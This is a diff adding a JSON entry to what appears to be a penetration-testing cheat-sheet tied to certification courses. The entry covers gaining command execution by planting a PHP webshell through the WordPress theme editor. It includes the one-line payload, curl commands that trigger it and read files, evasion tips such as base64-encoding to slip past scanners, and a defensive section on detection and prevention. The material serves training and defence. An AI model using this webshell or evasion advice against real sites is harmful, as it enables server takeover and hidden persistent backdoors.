@@ -1,0 +1,97 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "wordpress",
+    "curl"
+  ],
+  "tags": [
+    "wordpress",
+    "webshell",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "WordPress",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Add a one-line system() call to an editable theme file (404.php)",
+      "command": "# add to 404.php then run:"
+    },
+    {
+      "label": "Trigger the webshell with a command",
+      "command": "curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"
+    },
+    {
+      "label": "Read a flag / arbitrary file through the shell",
+      "command": "curl \"http://.../404.php?0=cat%20/var/www/flag.txt\""
+    }
+  ],
+  "notes": "Edit an INACTIVE theme (e.g. twentynineteen/404.php) so you don't break the live site. The file must stay syntactically valid PHP or the editor refuses to save.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "wpscan-bruteforce",
+      "note": "Provides the admin login needed to edit a theme.",
+      "rel": "prereq"
+    },
+    {
+      "id": "wp-admin-shell-msf",
+      "note": "Automated equivalent.",
+      "rel": "alternative"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Upgrade the webshell to an interactive reverse shell.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "wp-theme-webshell",
+  "name": "WordPress - Theme Editor Webshell (RCE)",
+  "command": "system($_GET[0]);",
+  "description": "With admin access, edit an inactive theme's PHP file (e.g. 404.php) via Appearance > Theme Editor to add a PHP system() call, then invoke it for command execution.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "WordPress's theme editor allows authenticated admin users to edit PHP template files directly through the web UI. Inserting a PHP webshell into any theme file (e.g., 404.php) creates a persistent backdoor executed on each HTTP request to that template.",
+    "prerequisites": "Valid WordPress admin credentials. Theme editing not disabled. write permission on theme files for www-data.",
+    "impact": "PHP webshell execution as the web server user. Leads to full server compromise, lateral movement to database, and persistent backdoor installation.",
+    "detection": "WordPress audit log showing theme file edit. File integrity alert on theme directory (WordFence). Outbound connections from web server process. New system()/exec() calls in theme PHP files.",
+    "artifacts": "WordPress audit log (theme file modification) | File system change: modified PHP in /wp-content/themes/ | Web server access log (GET to theme file with cmd param) | WordFence file change alert",
+    "prevention": "Disable file editing: define('DISALLOW_FILE_EDIT', true) in wp-config.php. Apply least privilege — web server user should not write to theme directories. Use read-only filesystem mounts in containers.",
+    "misconfiguration": "WordPress admin panel file editor enabled. www-data has write access to /wp-content/themes/. No filesystem integrity monitoring.",
+    "vulnerable_config": "# wp-config.php default\n# File editor NOT disabled\n# /wp-content/themes/ writable by www-data",
+    "secure_config": "# wp-config.php\ndefine('DISALLOW_FILE_EDIT', true);\ndefine('DISALLOW_FILE_MODS', true);\n\n# Filesystem\nchown -R root:www-data /var/www/html/wp-content/themes/\nchmod -R 640 /var/www/html/wp-content/themes/**/*.php",
+    "evasion": "Edit a less-visited file (404.php, footer.php). Use base64-encoded PHP to evade content scanners.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1505.003",
+      "OWASP A04:2021"
+    ]
+  }
+}
